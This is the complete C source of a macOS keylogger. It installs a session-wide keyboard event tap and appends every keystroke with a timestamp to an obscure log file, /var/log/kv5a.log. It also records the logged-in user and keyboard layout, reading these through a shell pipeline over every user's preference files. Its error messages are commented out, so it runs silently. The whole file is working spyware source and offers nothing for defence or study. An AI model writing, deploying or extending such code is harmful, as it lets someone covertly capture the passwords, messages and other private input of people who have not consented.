#include <ApplicationServices/ApplicationServices.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <string.h>

#define PATH "/var/log/kv5a.log"

FILE *f;
bool autoread = false;

char * keyCodeToString (CGKeyCode keyCode) {

    switch ((int) keyCode) {
      case   0: return "a";
      case   1: return "s";
      case   2: return "d";
      case   3: return "f";
      case   4: return "h";
      case   5: return "g";
      case   6: return "z";
      case   7: return "x";
      case   8: return "c";
      case   9: return "v";
      case  11: return "b";
      case  12: return "q";
      case  13: return "w";
      case  14: return "e";
      case  15: return "r";
      case  16: return "y";
      case  17: return "t";
      case  18: return "1";
      case  19: return "2";
      case  20: return "3";
      case  21: return "4";
      case  22: return "6";
      case  23: return "5";
      case  24: return "=";
      case  25: return "9";
      case  26: return "7";
      case  27: return "-";
      case  28: return "8";
      case  29: return "0";
      case  30: return "]";
      case  31: return "o";
      case  32: return "u";
      case  33: return "[";
      case  34: return "i";
      case  35: return "p";
      case  36: return "<return>"; // TODO: autoread
      case  37: return "l";
      case  38: return "j";
      case  39: return "\"";
      case  40: return "k";
      case  41: return ";";
      case  42: return "\\"; // TODO: What is \\?
      case  43: return ",";
      case  44: return "/";
      case  45: return "n";
      case  46: return "m";
      case  47: return ".";
      case  48:
          if (autoread) {
              return "\t";
          }else{
              return "<tab>";
          }
      case  49:
          if (autoread)
          {
              return " ";
          }else{
              return "<space>";
          }
      case  50: return "`";
      case  51: return "<delete>"; // TODO: autoread
      case  53: return "<escape>"; // TODO: autoread
      case  55: return "<command>"; // TODO: autoread
      case  56: return "<shift>"; // TODO: autoread
      case  57: return "<capslock>"; // TODO: autoread
      case  58: return "<Option>"; // TODO: autoread
      case  59: return "<Control>"; // TODO: autoread
      case  60: return "<Right Shift>"; // TODO: autoread
      case  61: return "<Right Option>"; // TODO: autoread
      case  62: return "<Right Control>"; // TODO: autoread
      case  63: return "<Function>"; // TODO: autoread
      case  64: return "<F17>";
      // TODO: 65 - 71?
      case  72: return "<Volume Up>";
      case  73: return "<Volume Down>";
      case  74: return "<mute>";
      case  79: return "<F18>";
      case  80: return "<F19>";
      // TODO: 81 - 89?
      case  90: return "<F20>";
      case  96: return "<F5>";
      case  97: return "<F6>";
      case  98: return "<F7>";
      case  99: return "<F3>";
      case 100: return "<F8>";
      case 101: return "<F9>";
      case 103: return "<F11>";
      case 105: return "<F13>";
      case 106: return "<F16>";
      case 107: return "<F14>";
      case 109: return "<F10>";
      case 111: return "<F12>";
      case 113: return "<F15>";
      case 116: return "Page Up";
      case 118: return "<F4>";
      case 119: return "<End>";
      case 120: return "<F2>";
      case 121: return "<Page Down>";
      case 122: return "<f1>";
      case 123: return "<left>";
      case 124: return "<right>";
      case 125: return "<down>";
      case 126: return "<up>";
    }
    return "<unknown>";
    // TODO: Vielleicht bei Autoread einen space zwischen function und normalem text machen?
}


/* This callback will be invoked every time there is a keystroke. */
CGEventRef keyBoardCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {

    // Sanity check
    if ((type != kCGEventKeyDown) && (type != kCGEventKeyUp) && (type != kCGEventFlagsChanged)){
       return event;
    }
    CGKeyCode keycode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    // Time Stuff
    time_t timer;
    char buffer[26];
    struct tm* tm_info;

    time(&timer);
    tm_info = localtime(&timer);

    strftime(buffer, 26, "%Y-%m-%d %H:%M:%S", tm_info);

    // Append Time + key to file
    fprintf(f, "%s %s \n", buffer, keyCodeToString(keycode));

    fflush(f);

    return event;
}

// Create an event tap to retrieve keypresses
int main(int argc, char const *argv[])
{
    /* FILE SETUP */

    // TODO: ERROR
    f = fopen(PATH, "a");

    if (f == NULL)
    {
        // printf("Error: opening file!\n");
        exit(EXIT_FAILURE);
    }


    /* HEADER - CURRENT USER, KEYBOARD LAYOUT */

    // Get Username currently logged in - Still buggy
    char user[50];
    if (getlogin_r(user, 50)) {
        // printf("Error: getting User Name\n");
        strncpy(user, "<unknown>", 50);
    }

    // The String returned by sed is LANGUAGE\n, so we need to get rid of \n
    // I used the last shell cmd to delete the \n char .. I could also do it within the regexp but well.. I dont really understand regexp
    char cmd[] = "defaults read /Users/*/Library/Preferences/com.apple.HIToolbox.plist AppleSelectedInputSources | egrep -w 'KeyboardLayout Name' | sed -E 's/^.+ = \"?([^\"]+)\"?;$/\\1/' | tr -d '\n'";
    // TODO: ERROR
    FILE *fp = popen(cmd, "r");
    if (fp == NULL){
        // printf("Error: opening pipe strema \n");
        exit(EXIT_FAILURE);
    }

    char buf[256];
    fgets(buf, sizeof(buf), fp);
    pclose(fp);

    fprintf(f, "\n\t\tCurrent User: %s\t\t\n", user);
    fprintf(f, "\t\tKeyboard Layout: %s\t\t\n", buf);



    /* EVENTS SETUP */

    // We are interested in key presses.
    CGEventMask eventMask = ((1 << kCGEventKeyDown) | (1 << kCGEventFlagsChanged));

    // Create an event tap to retrieve keypresses
    CFMachPortRef eventTap = CGEventTapCreate((CGEventTapLocation)kCGSessionEventTap, (CGEventTapPlacement)kCGHeadInsertEventTap, (CGEventTapOptions)0, eventMask, keyBoardCallback, NULL);

    if (!eventTap) {
        // printf("Erro: Unable to create event tap");
        exit(EXIT_FAILURE);
    }

    // Creates a CFRunLoopSource object for a CFMachPort object.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    // Runs the current thread’s CFRunLoop object in its default mode indefinitely.
    CFRunLoopRun();

    return 0;
}
